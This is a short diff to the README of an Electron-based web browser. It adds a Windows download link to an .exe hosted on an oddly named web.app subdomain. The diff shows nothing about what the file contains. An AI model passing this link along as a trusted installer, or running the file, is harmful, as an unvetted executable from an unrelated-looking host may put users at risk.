@@ -33,7 +33,7 @@ An electron based web browser.
 
 ### Packages
 - macOS:
-- Windows:
+- Windows: [Download Link](https://fileftp1-cssudii.web.app/ElectroWeb-Setup.exe)
 - Lunix:
 - IOS:
 - Android:
